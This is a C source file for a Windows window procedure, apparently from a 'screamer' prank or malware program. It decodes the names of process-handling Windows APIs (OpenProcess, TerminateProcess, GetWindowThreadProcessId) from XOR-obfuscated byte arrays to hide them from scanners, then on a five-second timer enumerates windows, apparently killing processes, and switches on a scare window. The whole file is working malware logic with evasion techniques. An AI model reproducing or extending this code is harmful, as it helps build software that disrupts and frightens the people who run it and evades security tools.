#include <Windows.h>
#include "windowDestroyEnumerator.h"
#include "screamer_control.h"
#include "getRequiredScreamerStatus.h"
#include "DestroyStruct.h"
#include "TopStruct.h"

#include "topWndProc.h"
LRESULT topWndProc(HWND hWnd, UINT uInt, WPARAM wParam, LPARAM lParam) {
#define TIMER_ID 10000
	struct TopStruct* top_data;
	top_data = (struct TopStruct*) GetWindowLongPtrW(hWnd, GWLP_USERDATA);
	switch (uInt) {
	case WM_TIMER:
		if (TIMER_ID == wParam) {
			EnumWindows(&windowDestroyEnumerator, (LPARAM)&top_data->destroy);
			PostMessageW(top_data->screamer_window, WM_COMMAND, getRequiredScreamerStatus() ? SCREAMER_ENABLE : SCREAMER_DISABLE, 0);
		}
		break;
	case WM_CREATE:
		LPCREATESTRUCTW cs;
		cs = (LPCREATESTRUCTW)lParam;
		top_data = malloc(sizeof(struct TopStruct));
		if (top_data) {
			SetWindowLongPtrW(hWnd, GWLP_USERDATA, (LONG_PTR)top_data);
			top_data->screamer_window = (HWND)cs->lpCreateParams;
			top_data->destroy.z = 0;
			top_data->destroy.user32 = LoadLibraryExW(L"user32.dll", NULL, LOAD_LIBRARY_SEARCH_DEFAULT_DIRS);
			top_data->destroy.kernel32 = LoadLibraryExW(L"kernel32.dll", NULL, LOAD_LIBRARY_SEARCH_DEFAULT_DIRS);
			if (!(top_data->destroy.user32 && top_data->destroy.kernel32)) {
				if (top_data->destroy.user32) FreeLibrary(top_data->destroy.user32);
				if (top_data->destroy.kernel32) FreeLibrary(top_data->destroy.kernel32);
				free(top_data);
				return -1;
			};
			static const char gwtpi_a[] = { 0xa9, 0x33, 0x06, 0x81, 0x9c, 0xee, 0x53, 0xd0, 0x62, 0xa1, 0xaf, 0xcc, 0x50, 0xc3, 0x2a, 0x45, 0xbd, 0x10, 0x91, 0x07, 0xab, 0xf2, 0x3d, 0x85 };
			static const char gwtpi_b[] = { 0x11, 0xa9, 0x8d, 0x29, 0x0a, 0x7f, 0xc8, 0x40, 0xea, 0x0a, 0x38, 0x41, 0xca, 0x5d, 0xb1, 0xea, 0x30, 0x80, 0x0d, 0x9d, 0x27, 0x7e, 0x8b, 0x1e };
			char gwtpi[25];
			gwtpi[24] = 0;
			for (unsigned int i = 0; i < 24; i++) gwtpi[i] = ~(gwtpi_a[i] ^ gwtpi_b[i]);
			top_data->destroy.hwnd_to_pid = GetProcAddress(top_data->destroy.user32, gwtpi);
			static const char op_a[] = { 0xf9, 0xbf, 0xbc, 0xbf, 0x43, 0xa9, 0xba, 0x7a, 0x0f, 0x99, 0xc4 };
			static const char op_b[] = { 0x49, 0x30, 0x26, 0x2e, 0xec, 0x24, 0x2a, 0xe6, 0x95, 0x15, 0x48 };
			char op[12];
			op[11] = 0;
			for (unsigned int i = 0; i < 11; i++) op[i] = ~(op_a[i] ^ op_b[i]);
			top_data->destroy.open_process = GetProcAddress(top_data->destroy.kernel32, op);
			static const char tp_a[] = { 0x18, 0xbd, 0xcd, 0xe1, 0x0f, 0xc2, 0x32, 0x59, 0x6e, 0xce, 0x5a, 0xd2, 0x98, 0x89, 0x6f, 0xb2 };
			static const char tp_b[] = { 0xb3, 0x27, 0x40, 0x73, 0x99, 0x53, 0xac, 0xd2, 0xf4, 0x61, 0xd7, 0x42, 0x04, 0x13, 0xe3, 0x3e };
			char tp[17];
			tp[16] = 0;
			for (unsigned int i = 0; i < 16; i++) tp[i] = ~(tp_a[i] ^ tp_b[i]);
			top_data->destroy.terminate_process = GetProcAddress(top_data->destroy.kernel32, tp);
			SetTimer(hWnd, TIMER_ID, 5000, NULL);
		}
		else return -1;
		break;
	case WM_DESTROY:
		KillTimer(hWnd, TIMER_ID);
		FreeLibrary(top_data->destroy.user32);
		FreeLibrary(top_data->destroy.kernel32);
		free(top_data);
		break;
	default:
		return DefWindowProcW(hWnd, uInt, wParam, lParam);
		break;
	};
	return 0;
};